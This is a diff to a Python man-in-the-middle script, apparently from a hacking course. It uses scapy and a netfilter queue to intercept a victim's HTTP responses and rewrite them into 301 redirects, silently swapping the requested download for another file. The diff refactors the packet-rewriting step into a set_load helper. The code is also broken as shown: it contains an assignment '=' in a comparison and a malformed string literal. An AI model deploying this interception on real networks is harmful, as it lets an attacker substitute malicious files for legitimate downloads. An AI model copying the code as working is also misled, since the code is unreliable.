@@ -17,6 +17,13 @@ def restore_iptables():
     print("\n[+] Flushing IPTables\n")
     subprocess.call(["iptables", "--flush"])
     
+def set_load(packet, load):
+    packet[scapy.Raw].load = load
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
+    return packet
+    
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
@@ -29,15 +36,11 @@ def process_packet(packet):
                 print(scapy_packet.show())
         elif scapy_packet[scapy.TCP].sport = 80: #if this exists, packet is HTTP response inbound
             if scapy_packet[scapy.TCP].seq in ack_list: #if SEQ is in ack list, there are packets that match
-                print("++Replacing file")
                 if scapy_packet[scapy.TCP].seq in ack_list:
-                    ack_list.remove(scapy_packet[scapy.TCP].seq) #remove from list since it's no
-                    #longer needed once it's printed
-                    scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://testhtml5.vulnweb.com/static/img/logo2.png"
-                    del scapy_packet[scapy.IP].len
-                    del scapy_packet[scapy.IP].chksum
-                    del scapy_packet[scapy.TCP].chksum
-                    packet.set_payload(str(scapy_packet))
+                    ack_list.remove(scapy_packet[scapy.TCP].seq)
+                    print("++Replacing file")
+                    modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://testhtml5.vulnweb.com/static/img/logo2.png"\n\n")
+                    packet.set_payload(str(modified_packet))
 
     packet.accept() #forward packets to target, connectivity seems normal
 
